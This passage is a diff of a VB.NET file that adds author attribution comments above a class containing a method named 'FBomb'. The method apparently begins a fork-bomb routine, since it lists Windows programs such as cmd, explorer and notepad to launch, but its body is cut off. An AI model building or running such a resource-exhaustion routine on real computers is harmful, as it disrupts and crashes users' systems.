@@ -1,4 +1,6 @@
-﻿Public Class V2
+﻿''||       AUTHOR Arsium       ||
+''||       github : https://github.com/arsium       ||
+Public Class V2
     Public Shared Sub FBomb(ByVal L As Integer)
         Dim h As String() = {"notepad", "explorer", "write", "cmd", "cmstp", "colorcpl",
             "conhost", "control", "dfrgui", "iexpress", "msinfo32", "mspaint"}
